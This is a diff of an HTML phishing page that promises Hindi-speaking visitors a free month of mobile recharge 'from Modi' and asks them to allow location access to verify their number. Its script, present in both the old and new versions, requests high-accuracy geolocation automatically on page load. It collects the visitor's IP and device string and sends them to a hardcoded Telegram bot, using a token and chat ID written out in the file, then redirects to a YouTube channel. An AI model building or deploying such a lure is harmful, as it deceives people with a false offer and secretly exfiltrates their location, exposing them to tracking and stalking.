@@ -1,97 +1,96 @@
-<!DOCTYPE html><html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Modi 1 Month Free Recharge</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f2f2f2;
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .container {
-      background: white;
-      padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-    }
-    h1 {
-      color: #2e7d32;
-    }
-    button {
-      background: #2e7d32;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 50px;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-    button:hover {
-      background: #1b5e20;
-    }
-    .small {
-      font-size: 0.8rem;
-      color: #666;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>🎁 मोदी जी की तरफ से 1 महीने का Free Recharge</h1>
-    <p>अपने नंबर की पुष्टि के लिए नीचे "<strong>Allow Location</strong>" पर क्लिक करें 👇</p>
-    <button onclick="getLocation()">📍 Allow Location</button>
-    <p class="small">सिर्फ एक बार अनुमति दें। डेटा पूरी तरह सुरक्षित है।</p>
-  </div>  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendData, showError, {
-          enableHighAccuracy: true
-        });
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
-    }
-
-    async function sendData(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
-      const time = new Date().toLocaleString();
-
-      // Fetch IP and device info
-      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
-      const ip = ipData.ip;
-      const device = navigator.userAgent;
-
-      const message = `📍 New Location Received:%0A📌 Lat: ${lat}%0A📌 Long: ${lon}%0A🎯 Accuracy: ${accuracy} meters%0A🕒 Time: ${time}%0A%0A🌐 IP: ${ip}%0A📱 Device: ${device}`;
-
-      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
-      const chatId = "6038115234";
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-
-      await fetch(url);
-
-      // Optional: redirect to YouTube channel
-      window.location.href = "https://youtube.com/@ashishsharma14";
-    }
-
-    function showError(error) {
-      alert("Location access denied or failed. Please try again.");
-    }
-
-    // Optional: auto request on page load
-    window.onload = () => {
-      setTimeout(getLocation, 1000);
-    };
-  </script></body>
+<!DOCTYPE html>
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
+  <title>Modi 1 Month Free Recharge</title>  
+  <style>  
+    body {  
+      margin: 0;  
+      padding: 0;  
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;  
+      background: #f2f2f2;  
+      color: #333;  
+      display: flex;  
+      justify-content: center;  
+      align-items: center;  
+      height: 100vh;  
+      text-align: center;  
+    }  
+    .container {  
+      background: white;  
+      padding: 30px;  
+      border-radius: 20px;  
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);  
+    }  
+    h1 {  
+      color: #2e7d32;  
+    }  
+    button {  
+      background: #2e7d32;  
+      color: white;  
+      padding: 15px 30px;  
+      border: none;  
+      border-radius: 50px;  
+      font-size: 1rem;  
+      cursor: pointer;  
+      transition: background 0.3s ease;  
+    }  
+    button:hover {  
+      background: #1b5e20;  
+    }  
+    .small {  
+      font-size: 0.8rem;  
+      color: #666;  
+      margin-top: 10px;  
+    }  
+  </style>  
+</head>  
+<body>  
+  <div class="container">  
+    <h1>🎁 मोदी जी की तरफ से 1 महीने का Free Recharge</h1>  
+    <p>अपने नंबर की पुष्टि के लिए नीचे "<strong>Allow Location</strong>" पर क्लिक करें 👇</p>  
+    <button onclick="getLocation()">📍 Allow Location</button>  
+    <p class="small">सिर्फ एक बार अनुमति दें। डेटा पूरी तरह सुरक्षित है।</p>  
+  </div>  
+  
+  <script>  
+    function getLocation() {  
+      if (navigator.geolocation) {  
+        navigator.geolocation.getCurrentPosition(sendData, showError, {  
+          enableHighAccuracy: true  
+        });  
+      } else {  
+        alert("Geolocation is not supported by this browser.");  
+      }  
+    }  
+  
+    async function sendData(position) {  
+      const lat = position.coords.latitude;  
+      const lon = position.coords.longitude;  
+      const accuracy = position.coords.accuracy;  
+      const time = new Date().toLocaleString();  
+  
+      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());  
+      const ip = ipData.ip;  
+      const device = navigator.userAgent;  
+  
+      const message = `📍 New Location Received:%0A📌 Lat: ${lat}%0A📌 Long: ${lon}%0A🎯 Accuracy: ${accuracy} meters%0A🕒 Time: ${time}%0A%0A🌐 IP: ${ip}%0A📱 Device: ${device}`;  
+  
+      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";  
+      const chatId = "6038115234";  
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;  
+  
+      await fetch(url);  
+      window.location.href = "https://youtube.com/@ashishsharma14";  
+    }  
+  
+    function showError(error) {  
+      alert("Location access denied or failed. Please try again.");  
+    }  
+  
+    // 🔄 Auto ask location on page load  
+    window.onload = getLocation;
+  </script>  
+</body>  
 </html>
